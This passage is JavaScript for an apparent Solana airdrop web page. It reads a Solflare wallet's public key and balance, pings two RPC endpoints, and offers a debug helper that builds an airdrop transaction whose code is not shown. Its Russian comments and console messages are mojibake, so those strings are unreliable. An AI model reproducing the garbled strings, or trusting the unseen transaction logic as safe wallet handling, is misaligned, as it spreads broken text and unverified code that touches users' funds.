        console.log('‚úÖ Solana Web3.js —É–∂–µ –∑–∞–≥—Ä—É–∂–µ–Ω');
        initializeWallet();
    }
}

// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∫–æ—à–µ–ª—å–∫–∞ –ø—Ä–∏ –Ω–∞–ª–∏—á–∏–∏
function initializeWallet() {
    console.log('üîß –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∫–æ—à–µ–ª—å–∫–∞...');
    
    if (window.solflare) {
        console.log('üîç –û–±—ä–µ–∫—Ç Solflare:', window.solflare);
        console.log('üîç Solflare –ø—É–±–ª–∏—á–Ω—ã–π –∫–ª—é—á:', window.solflare.publicKey);
        console.log('üîç Solflare _publicKey:', window.solflare._publicKey);
        
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —É–∂–µ –ø–æ–¥–∫–ª—é—á–µ–Ω –ª–∏ –∫–æ—à–µ–ª–µ–∫
        if (window.solflare.isConnected) {
            console.log('‚úÖ –ö–æ—à–µ–ª–µ–∫ —É–∂–µ –ø–æ–¥–∫–ª—é—á–µ–Ω');
            // –ü—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å –ø—É–±–ª–∏—á–Ω—ã–π –∫–ª—é—á
            if (window.solflare.publicKey) {
                publicKey = window.solflare.publicKey.toString();
                console.log('‚úÖ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø–æ–ª—É—á–µ–Ω –ø—É–±–ª–∏—á–Ω—ã–π –∫–ª—é—á:', publicKey);
                handleWalletConnected();
            }
        } else {
            console.log('‚ÑπÔ∏è –ö–æ—à–µ–ª–µ–∫ –Ω–µ –ø–æ–¥–∫–ª—é—á–µ–Ω');
        }
    } else {
        console.log('‚ÑπÔ∏è –ö–æ—à–µ–ª–µ–∫ –Ω–µ –ø–æ–¥–∫–ª—é—á–µ–Ω');
    }
}

window.debugWallet = {
    getPublicKey: () => publicKey,
    getBalance: () => solBalance,
    isConnected: () => walletConnected,
    getSolflare: () => window.solflare,
    refreshBalance: async () => {
        console.log('üîÑ –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –±–∞–ª–∞–Ω—Å–∞...');
        await getWalletBalance();
        updateBalanceDisplay();
        console.log('‚úÖ –ë–∞–ª–∞–Ω—Å –æ–±–Ω–æ–≤–ª–µ–Ω:', solBalance, 'SOL');
    },
    testWorkingRpc: async () => {
        console.log('üß™ –¢–µ—Å—Ç —Ä–∞–±–æ—á–∏—Ö RPC endpoints...');
        const endpoints = [
            "https://solana-rpc.publicnode.com",
            "https://api.devnet.solana.com"
        ];
        
        for (const endpoint of endpoints) {
            try {
                const payload = {
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "getHealth"
                };
                
                const response = await fetch(endpoint, {
                    method: 'POST',
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify(payload)
                });
                
                if (response.ok) {
                    const data = await response.json();
                    console.log(`‚úÖ ${endpoint}: HEALTHY`);
                } else {
                    console.log(`‚ùå ${endpoint}: HTTP ${response.status}`);
                }
            } catch (error) {
                console.log(`‚ùå ${endpoint}: ${error.message}`);
            }
        }
    },
    testTransactionCreation: async () => {
        console.log('üß™ –¢–µ—Å—Ç —Å–æ–∑–¥–∞–Ω–∏—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏...');
        try {
            const transaction = await createAirdropTransaction();
            console.log('‚úÖ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è —Å–æ–∑–¥–∞–Ω–∞ —É—Å–ø–µ—à–Ω–æ');
            return transaction;
        } catch (error) {
            console.error('‚ùå –û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏:', error);
            return null;
        }
    }
};

console.log('üîß –ì–ª–æ–±–∞–ª—å–Ω—ã–π –æ–±—ä–µ–∫—Ç –æ—Ç–ª–∞–¥–∫–∏ –¥–æ—Å—Ç—É–ø–µ–Ω –∫–∞–∫ debugWallet');
